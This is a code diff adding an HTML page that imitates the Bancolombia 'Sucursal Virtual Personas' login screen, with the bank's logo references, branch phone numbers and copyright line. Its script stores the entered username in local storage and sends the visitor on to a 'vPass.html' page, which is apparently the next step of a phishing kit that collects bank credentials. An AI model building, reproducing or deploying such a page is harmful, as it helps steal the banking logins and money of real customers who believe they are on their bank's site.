@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+	<title>Bancolombia Sucursal Virtual Personas</title>
+
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+	<script src="./js/validations.js"></script>
+	<link href="./css/style.css" rel="stylesheet">
+	<link href="./css/stylesheet.css" rel="stylesheet">
+	<link rel="icon" type="image/png" href="img/logo.png" />
+</head>
+
+<body>
+	<div class="contenido">
+		<div class="cabecera">
+			<div class="logo">
+				<img src="img/logo.svg">
+				<br>
+				<span class="subtitulo">Sucursal Virtual Personas</span>
+				<br>
+				<span class="texto-min">Fecha y hora actual:</span> <span class="texto-min" id="fecha-hora">Lunes 13 de
+					Junio de 2022 9:23:11 AM</span>
+			</div>
+			<div class="titulo">Inicio de sesión</div>
+			
+			<div class="mensaje" id="err-mensaje">
+				<table>
+					<tr>
+						<td valign="middle"><img src="img/error.jpg" style="width: 40px;"></td>
+						<td valign="middle" style="padding-left: 12px;"><span
+								style="font-size: 20px; color: #000; line-height: 20px;">Error</span><br><span>Por favor
+								ingesar la información requerida.</span></td>
+					</tr>
+				</table>
+			</div>
+
+			<!-- ERROR MENSAJE -->
+			<div class="mensaje" id="alt-mensaje" style="display:none;">
+				<table>
+					<tr>
+						<td valign="middle"><img src="img/error.jpg" style="width: 40px;"></td>
+						<td valign="middle" style="padding-left: 12px;"><span
+								style="font-size: 20px; color: #000; line-height: 20px;">Error</span><br><span>Usuario o
+								clave inválida. Por favor intente de nuevo.</span></td>
+					</tr>
+				</table>
+			</div>
+
+		</div>
+		<div class="cuerpo">
+			<div class="pnlizq">
+				<div class="formulario">
+					<div class="form-titulo">Usuario</div>
+					<div class="descripcion">
+						Si no tienes un usuario asignado ingresa con tu documento de identidad
+					</div>
+					<div class="form-cuerpo">
+						<div style="text-align: left;">
+							<img src="img/info.jpg" class="icon-info"><span class="etiqueta">Ingresa tu usuario</span>
+						</div>
+						<div class="input-icono user">
+							<input type="text" name="txtUsuario" id="txtUsuario" autocomplete="off">
+						</div>
+						<br>
+						<button id="btnUsuario" name="btnUsuario" class="btn btn-amarillo"
+							type="button">Continuar</button>
+						<br>
+						<div class="texto" style="text-align: right;">
+							<div class="vinculos">
+								<a href="#">¿Olvidaste tu usuario?</a>
+							</div>
+							<div class="vinculos">
+								<a href="#">¿Problemas para conectarte?</a>
+							</div>
+						</div>
+					</div>
+				</div>
+				<br>
+				<div class="lista-links ">
+					<div class="texto">
+						<div class="vinculos">
+							<table>
+								<tr>
+									<td valign="middle"><img src="img/demo.jpg"></td>
+									<td valign="middle"><a href="#">Conoce sobre sucursal virtual persona</a></td>
+								</tr>
+							</table>
+						</div>
+						<div class="vinculos">
+							<table>
+								<tr>
+									<td valign="middle"><img src="img/seguridad.jpg"></td>
+									<td valign="middle"><a href="#">Aprende sobre Seguridad</a></td>
+								</tr>
+							</table>
+						</div>
+						<div class="vinculos">
+							<table>
+								<tr>
+									<td valign="middle"><img src="img/reglamento.jpg"></td>
+									<td valign="middle"><a href="#">Reglamento Sucursal Virtual</a></td>
+								</tr>
+							</table>
+						</div>
+						<div class="vinculos">
+							<table>
+								<tr>
+									<td valign="middle"><img src="img/politica.jpg"></td>
+									<td valign="middle"><a href="#">Política de Privacidad</a></td>
+								</tr>
+							</table>
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="pnlder">
+				<a href="#"><img src="img/bannerUserAct.png" class="publicidad"></a><br><br>
+				<div class="texto" style="text-align:center;">¿No conoces la Sucursal Virtual Personas de Bancolombia?
+					Conoce más <a href="">aquí</a></div>
+			</div>
+		</div>
+		<div class="pie">
+			<div class="direccion">Sucursal Telefónica Bancolombia: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510
+				90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 -
+				Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país 018000 9 12345.
+				Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14.</div>
+			<div class="ippie">
+				<span class="dirip">Dirección IP: <span id="ip"></span></span>
+				<span class="copyright">Copyright © 2023 Bancolombia S.A.</span>
+			</div>
+		</div>
+	</div>
+</body>
+
+</html>
+<script src="js/app.js"></script>
+<script type="text/javascript">
+
+	document.addEventListener('DOMContentLoaded', function () {
+		var btnUsuario = document.getElementById('btnUsuario');
+		var txtUsuario = document.getElementById('txtUsuario');
+		var errMensaje = document.getElementById('err-mensaje');
+
+		btnUsuario.addEventListener('click', function () {
+			if (txtUsuario.value.length > 3) {
+				
+				// Guardar
+				info.user = txtUsuario.value;
+				LS.setItem('info', JSON.stringify(info));
+
+				// Redirigir
+				window.location.href = 'vPass.html';
+
+			} else {
+				errMensaje.style.display = 'block';
+				txtUsuario.classList.add('user-error');
+				txtUsuario.focus();
+			}
+		});
+
+		txtUsuario.addEventListener('keyup', function (e) {
+			txtUsuario.classList.remove('user-error');
+			errMensaje.style.display = 'none';
+		});
+	});
+
+</script>
